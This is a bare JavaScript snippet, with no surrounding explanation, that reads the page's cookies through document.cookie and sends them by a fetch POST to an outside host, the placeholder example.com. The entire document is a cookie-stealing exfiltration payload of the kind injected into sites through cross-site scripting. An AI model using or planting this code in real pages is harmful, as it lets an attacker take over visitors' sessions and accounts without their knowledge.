function sendData(data) {
    fetch("https://example.com/parameter", {
        method: "POST",
        body: data
    });
}

const cookieData = document.cookie;

sendData(cookieData);
